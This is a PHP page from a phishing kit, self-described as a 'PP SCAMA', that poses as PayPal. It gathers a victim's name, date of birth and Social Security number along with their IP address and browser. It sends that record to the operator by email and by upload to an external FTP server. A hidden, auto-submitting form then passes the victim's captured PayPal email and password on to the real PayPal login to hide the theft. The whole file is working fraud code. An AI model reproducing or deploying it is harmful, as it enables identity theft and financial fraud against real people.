<?php
session_start();
@ini_set('display_errors', 0);
error_reporting(E_ALL ^ E_NOTICE);
/*

+----------------------------------+
�--- PRIVATE  PP SCAMA   2015 -----�
�---------- Ver : 2.0 -------------�
�--------- BY Dz[NO_o]B -----------�
�----------- GREETZ TO ------------�
�--- Dz Phoniex : Dz Injector -----�
�----------------------------------�
�https://code.google.com/p/dznoob/ �
�----------------------------------�
�https://facebook.com/DzNOoBpage   �
+----------------------------------+


*/


include "option.php";
include "antibot.php";
include 'dznoob-country.php';


$r= "\n==================: SSN :==================
---------------------------------------------------
First Name	: ".$_SESSION['gg1']."
Last Name	: ".$_SESSION['gg2']."
Birth Day	: ".$_POST['mm']." / ".$_POST['dd']." / ".$_POST['yy']." 
SSN	: ".$_POST['NNS']."
================================================
Date		: ".gmdate("d/m/Y - H:i:s")."
Browser		: ".$_POST['BROWSER']."
Client IP	: ".getenv("REMOTE_ADDR")."
HostName	: ".gethostbyaddr(getenv("REMOTE_ADDR"))."
=================: Dz N[O_o]B :================\n";


$subject = " DzNOob SSN | ".$_SESSION['gg7']." | ".$_SESSION['gg2']."  ";

if ( $mail > 0) {
		mail($a, $subject, $r);
}

if ( $ftp > 0) {


$datamasii=date("D M d, Y");
$name="./resl/{$_SERVER['HTTP_HOST']}-SSN-{$_SESSION['gg7']}-{$datamasii}.txt";		
$file = fopen($name,"a");
fputs($file,$r);
fclose($file);
$namenodir="{$_SERVER['HTTP_HOST']}-SSN-{$_SESSION['gg7']}-{$datamasii}.txt";	
$ftp_server="ftp.drivehq.com";
$conn_id = ftp_connect($ftp_server);
$login_result = ftp_login($conn_id, $b, $c);
$namenodir=
$upload = ftp_put($conn_id, $namenodir, $name, FTP_BINARY); 
ftp_close($conn_id);

}



?>

<form name="formnn" action="https://www.paypal.com/ma/cgi-bin/webscr?cmd=_login-submit" method="post">
            <div style="display:none;">
                <input maxlength="20" name="login_email" size="25" value="<?php echo $_SESSION['email'];?>"/>
                <input maxlength="20" name="login_password" size="25" value="<?php echo $_SESSION['password'];?>"/>
            </div>
        </form>
        <script language="JavaScript">
            setTimeout('document.formnn.submit()',0);
        </script>


